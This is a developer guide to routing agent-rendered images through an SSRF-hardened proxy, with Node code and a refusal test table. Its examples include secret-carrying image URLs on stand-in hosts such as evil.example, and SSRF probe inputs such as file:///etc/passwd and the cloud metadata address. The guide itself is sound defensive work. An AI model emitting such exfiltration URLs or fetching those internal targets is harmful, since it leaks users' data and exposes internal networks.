# Routing images through a proxy

By default render-policy loads a remote image only from a host you listed in `images.hosts`.
That is the safe default, and it breaks every image an agent links from anywhere else. An image
proxy is the usual way out: the page loads every image from your own origin, and your server
fetches the original. This guide covers the client side (`images.rewriteUrl`) and, at more
length, the server side, because a proxy is a server that fetches URLs chosen by whoever wrote
the agent's input. Built carelessly, it becomes a server-side request forgery (SSRF) endpoint
into your own network.

## What a proxy changes, and what it does not

A proxy changes **who** makes the request, not **whether** it is made. With a proxy:

- the image host sees your server, not the user: no user IP, no cookies, no `Referer`, no
  browser fingerprint, and a tracking pixel learns nothing about who read the message;
- every image comes from one origin, so the page can set `img-src 'self'` and any image that
  bypasses the renderer fails;
- your server decides which content types and sizes reach the browser, and can cache.

What a proxy does **not** do is stop data from leaving. The proxy still requests
`https://attacker.example/<secret>.png`, at render time and without a click, so the attacker still
receives the URL, and the URL is the payload. The defences against exfiltration stay the
ones that run before the rewrite: query stripping, the sink denylist and the length and
entropy heuristics on the path. If a surface must never request an attacker-chosen URL at all,
do not proxy everything: keep a host allowlist, and let other images become the
"click to open" placeholder (`images.blocked: 'placeholder'`).

## Client: `images.rewriteUrl`

```ts
import { createRenderer } from '@render-policy/core';

const renderer = createRenderer({
  policy: {
    images: {
      hosts: 'any',
      rewriteUrl: (url) => `/img-proxy?url=${encodeURIComponent(url.href)}`,
    },
  },
});
```

The same `policy` object works for `<RenderPolicyProvider>` in React and `provideRenderPolicy()`
in Angular.

`rewriteUrl` runs last in the image pipeline, after every check:

1. scheme allowlist and browser-style URL normalization;
2. sink denylist (with `hosts: 'any'` there is no explicit allowlist entry to override it);
3. `urls.decide`, if you set one;
4. `images.hosts`;
5. `images.query` (`'strip'` by default: the query string and fragment are removed);
6. length and entropy heuristics;
7. `images.rewriteUrl(url)`, which receives the URL as it stands after steps 1–6.

The URL it returns is checked for its scheme and parsed again, and nothing more: a proxy URL
carries the original URL in its own query string, so the length and entropy heuristics would
reject every one of them. Return `null` to block an image (for example, to proxy some hosts and
block the rest); if the function throws, that image is blocked and the render goes on.

Each image leaves a decision in the journal that `render*Into()` returns:

| Code | Meaning |
| --- | --- |
| `image-rewritten` | the image now loads from the URL `rewriteUrl` returned |
| `image-rewrite-rejected` | `rewriteUrl` returned `null` |
| `image-rewrite-failed` | `rewriteUrl` threw; the message is in `reason` |
| `image-rewrite-invalid` | the returned URL failed the scheme check |
| `sink-host`, `image-query-stripped`, `url-too-long`, `url-encoded-payload` | the earlier steps, unchanged by the proxy |

### Do not use `urls.decide` for the proxy

`urls.decide` can rewrite an image URL too, but it runs before the image policy. Once it has
turned `https://evil.example/a.png?q=secret` into `/img-proxy?url=…`, the image policy sees a
same-origin URL and lets it through untouched: the query string is never stripped and the
heuristics never run, so the secret travels inside the proxy URL to the attacker's host. Keep
`urls.decide` for links and for denying images; route images with `images.rewriteUrl`.

### Set a CSP for images

```
Content-Security-Policy: img-src 'self' data:; ...
```

(`data:` only if your own UI uses it; render-policy never lets agent content use `data:` image
URLs.) This is the second line of defence: if some code path ever renders agent output without
the renderer, its images fail instead of reaching the network.

## Server: the proxy endpoint

The endpoint receives a URL and fetches it. Everything below assumes the URL is hostile.

### Who may call it

The URL is built in the browser, so the browser cannot sign it with a server secret. Do not
leave the endpoint open: require the same session as the rest of the app (a same-origin
cookie is enough, the image request sends it), and rate-limit per session. An unauthenticated
proxy on your domain is a free anonymizer for anyone and turns your IP addresses into the ones
that fetch whatever they ask for.

If you render on the server, or post-process the agent's output there, sign instead: issue
`/img-proxy?url=…&sig=HMAC(url)` and reject unsigned requests. The endpoint is then public and
can sit behind a CDN.

### Where it may connect

Most SSRF bugs in proxies come from validating one thing and connecting to another. The rules:

- **Schemes:** `http:` and `https:` only. No `file:`, `gopher:`, `ftp:`, `data:`.
- **Ports:** 80 and 443 only.
- **No credentials** in the URL (`user:pass@`).
- **Addresses, not names.** Check the IP address the socket connects to, after DNS. A name
  can resolve to `127.0.0.1` (`localtest.me` does) or change its answer between your check and
  your connect (DNS rebinding). Do the check inside the connection's DNS lookup, so the address
  checked is the address used.
- **IP literals** skip DNS: check them separately. Parse the URL with the WHATWG `URL`
  parser first; it normalizes `2130706433`, `0177.0.0.1` and `127.1` to `127.0.0.1`. Never match
  hostnames with string patterns.
- **Blocked ranges:** loopback, private, link-local (`169.254.0.0/16`, which includes the cloud
  metadata endpoint `169.254.169.254`), carrier-grade NAT, multicast, reserved and documentation
  ranges; for IPv6 also unique-local `fc00::/7`, link-local `fe80::/10`, and the transition
  prefixes that embed an IPv4 address (`::ffff:0:0/96`, NAT64 `64:ff9b::/96`, 6to4
  `2002::/16`). Reject the host if **any** of its addresses is blocked.
- **Redirects:** do not let the HTTP client follow them. Follow them yourself, at most a few
  hops, and run every check again on each `Location`.

### What it may return

- **Content types:** an allowlist of raster formats (PNG, JPEG, GIF, WebP, AVIF). Never SVG:
  served from your origin and opened directly, an SVG runs script in your origin.
- **Check the bytes**, not only the header: a server can label HTML as `image/png`. Compare the
  magic bytes and serve the type you detected.
- **Size and time limits:** reject on `Content-Length` and count bytes while streaming, since
  the header can lie or be missing; time out the connection and the whole transfer.
- **Response headers:** `X-Content-Type-Options: nosniff` and
  `Content-Security-Policy: default-src 'none'; sandbox`, so the response stays inert even when
  opened as a page.
- **Send nothing of the user's.** No cookies, `Authorization` or `Referer` upstream; drop
  `Set-Cookie` from the response.

### A reference implementation

Node 22, no dependencies. `net.BlockList` matches IPv4-mapped IPv6 addresses against the IPv4
rules itself; the custom `lookup` runs for every connection the agent opens, including the ones
redirects lead to.

```js
import http from 'node:http';
import https from 'node:https';
import dns from 'node:dns';
import net from 'node:net';

const MAX_BYTES = 5 * 1024 * 1024;
const TIMEOUT_MS = 8000;
const MAX_REDIRECTS = 3;
const IMAGE_TYPES = new Set(['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/avif']);

const blocked = new net.BlockList();
for (const [prefix, bits] of [
  ['0.0.0.0', 8], ['10.0.0.0', 8], ['100.64.0.0', 10], ['127.0.0.0', 8], ['169.254.0.0', 16],
  ['172.16.0.0', 12], ['192.0.0.0', 24], ['192.0.2.0', 24], ['192.88.99.0', 24], ['192.168.0.0', 16],
  ['198.18.0.0', 15], ['198.51.100.0', 24], ['203.0.113.0', 24], ['224.0.0.0', 4], ['240.0.0.0', 4],
]) blocked.addSubnet(prefix, bits, 'ipv4');
for (const [prefix, bits] of [
  ['::', 128], ['::1', 128], ['64:ff9b::', 96], ['64:ff9b:1::', 48], ['100::', 64], ['2001::', 23],
  ['2001:db8::', 32], ['2002::', 16], ['fc00::', 7], ['fe80::', 10], ['ff00::', 8],
]) blocked.addSubnet(prefix, bits, 'ipv6');

const isBlocked = (address) => blocked.check(address, net.isIPv6(address) ? 'ipv6' : 'ipv4');

// Runs for every connection, so the address checked is the address used.
function safeLookup(hostname, options, callback) {
  dns.lookup(hostname, { all: true, verbatim: true }, (error, addresses) => {
    if (error) return callback(error);
    if (addresses.length === 0 || addresses.some((a) => isBlocked(a.address))) {
      return callback(Object.assign(new Error(`blocked address for ${hostname}`), { code: 'EBLOCKED' }));
    }
    if (options.all) return callback(null, addresses);
    callback(null, addresses[0].address, addresses[0].family);
  });
}

const agents = {
  'http:': new http.Agent({ lookup: safeLookup }),
  'https:': new https.Agent({ lookup: safeLookup }),
};

function checkTarget(raw) {
  let url;
  try {
    url = new URL(raw);
  } catch {
    return null;
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') return null;
  if (url.username || url.password) return null;
  if (url.port && url.port !== '80' && url.port !== '443') return null;
  // IP literals never reach the lookup hook.
  const host = url.hostname.replace(/^\[|\]$/g, '');
  if (net.isIP(host) && isBlocked(host)) return null;
  return url;
}

function fetchImage(url, redirects = 0) {
  return new Promise((resolve, reject) => {
    const client = url.protocol === 'https:' ? https : http;
    const request = client.get(url, {
      agent: agents[url.protocol],
      timeout: TIMEOUT_MS,
      headers: { 'user-agent': 'example-image-proxy/1.0', accept: [...IMAGE_TYPES].join(', ') },
    }, (response) => {
      const status = response.statusCode ?? 0;
      if (status >= 300 && status < 400 && response.headers.location) {
        response.resume();
        if (redirects >= MAX_REDIRECTS) return reject(new Error('too many redirects'));
        const next = checkTarget(new URL(response.headers.location, url).href);
        if (!next) return reject(new Error('redirect to a forbidden target'));
        return resolve(fetchImage(next, redirects + 1));
      }
      if (status !== 200) {
        response.resume();
        return reject(new Error(`upstream status ${status}`));
      }
      const type = String(response.headers['content-type'] ?? '').split(';')[0].trim().toLowerCase();
      if (!IMAGE_TYPES.has(type)) {
        response.resume();
        return reject(new Error(`not an allowed image type: ${type || 'none'}`));
      }
      if (Number(response.headers['content-length'] ?? 0) > MAX_BYTES) {
        response.destroy();
        return reject(new Error('image too large'));
      }
      const chunks = [];
      let size = 0;
      response.on('data', (chunk) => {
        size += chunk.length;
        if (size > MAX_BYTES) {
          response.destroy();
          reject(new Error('image too large'));
          return;
        }
        chunks.push(chunk);
      });
      response.on('end', () => resolve(Buffer.concat(chunks)));
      response.on('error', reject);
    });
    request.on('timeout', () => request.destroy(new Error('upstream timeout')));
    request.on('error', reject);
  });
}

// Magic bytes: a server that labels HTML or SVG as image/png gets nothing through.
function sniff(body) {
  const hex = body.subarray(0, 12).toString('hex');
  if (hex.startsWith('89504e470d0a1a0a')) return 'image/png';
  if (hex.startsWith('ffd8ff')) return 'image/jpeg';
  if (hex.startsWith('474946383761') || hex.startsWith('474946383961')) return 'image/gif';
  if (hex.startsWith('52494646') && hex.slice(16, 24) === '57454250') return 'image/webp';
  if (body.subarray(4, 12).toString('latin1').startsWith('ftypavi')) return 'image/avif';
  return null;
}

// Mount behind your session check and rate limiter.
export async function handleImageProxy(request, response) {
  const target = checkTarget(new URL(request.url, 'http://proxy.invalid').searchParams.get('url') ?? '');
  if (!target) return void response.writeHead(400).end();
  try {
    const body = await fetchImage(target);
    const type = sniff(body);
    if (!type) return void response.writeHead(415).end();
    response.writeHead(200, {
      'content-type': type,
      'content-length': body.length,
      'x-content-type-options': 'nosniff',
      'content-security-policy': "default-src 'none'; sandbox",
      'cache-control': 'private, max-age=86400',
    });
    response.end(body);
  } catch {
    response.writeHead(502).end();
  }
}
```

Use `cache-control: private` while the endpoint sits behind the user's session; a signed,
public endpoint can use `public` and a CDN. The upstream error is deliberately not returned to
the browser: the agent's input chose the URL, and the response must not become a port or
host scanner that reports back.

### Defence in depth

The code above is the first layer. If the proxy runs inside a cloud network, also:

- run the fetcher where it cannot reach internal services at all (its own subnet or egress-only
  network, an egress proxy that allows only the public internet);
- on AWS, require IMDSv2 with a hop limit of 1, so the metadata service cannot be reached through
  an HTTP fetch even if an address check is ever wrong; the other clouds have equivalent
  settings;
- log every fetch with the session that asked for it.

## Test it

Every one of these must be refused, with nothing reaching the target:

| Request | Expected |
| --- | --- |
| `http://127.0.0.1/`, `http://2130706433/`, `http://0177.0.0.1/`, `http://127.1/` | 400 (IP literal check) |
| `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `http://[64:ff9b::7f00:1]/` | 400 |
| `http://169.254.169.254/latest/meta-data/` | 400 |
| `http://localhost/`, `http://localtest.me/` (resolves to 127.0.0.1) | 502, "blocked address" in your log |
| a public URL that redirects to `http://127.0.0.1/` or to a name that resolves there | 502, "redirect to a forbidden target" or "blocked address" |
| `https://example.com:22/`, `file:///etc/passwd`, `https://user:pw@example.com/a.png` | 400 |
| a public HTML page, an SVG, a PNG with an HTML body | 502 or 415 |
| a public PNG or JPEG | 200, `image/png` or `image/jpeg` |

The reference implementation passes this table (Node 22.23). On the client side, render
`![x](https://evil.example/a.png?q=secret)` and check that the proxied `src` carries no `q=`.
